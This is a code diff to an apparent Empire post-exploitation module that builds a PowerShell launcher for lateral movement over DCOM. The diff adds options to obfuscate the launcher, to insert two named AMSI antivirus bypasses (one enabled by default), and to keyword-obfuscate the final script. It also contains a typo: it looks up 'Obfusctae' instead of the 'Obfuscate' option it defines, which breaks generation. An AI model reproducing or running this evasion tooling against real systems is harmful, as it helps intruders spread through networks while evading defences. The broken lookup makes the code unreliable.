@@ -2,6 +2,7 @@ from __future__ import print_function
 from builtins import str
 from builtins import object
 from lib.common import helpers
+import threading
 
 class Module(object):
 
@@ -62,6 +63,26 @@ class Module(object):
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -83,6 +104,9 @@ class Module(object):
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
+        # used to protect self.http and self.mainMenu.conn during threaded listener access
+        self.lock = threading.Lock()
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -91,13 +115,25 @@ class Module(object):
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
         method = self.options['Method']['Value']
         computerName = self.options['ComputerName']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+        if (self.options['Obfusctae']['Value']).lower() == 'true':
+            Obfuscate =True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-DCOM.ps1"
         if obfuscate:
@@ -125,7 +161,11 @@ class Module(object):
         else:
 
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
+                                                              obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,
+                                                              userAgent=userAgent, proxy=proxy,
+                                                              proxyCreds=proxyCreds, AMSIBypass=AMSIBypass,
+                                                              AMSIBypass2=AMSIBypass2)
 
             if launcher == "":
                 print(helpers.color("[!] Error in launcher generation."))
@@ -140,4 +180,10 @@ class Module(object):
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+
+        conn = self.get_db_connection()
+        self.lock.acquire()
+        script = helpers.keyword_obfuscation(script, conn)
+        self.lock.release()
+
         return script
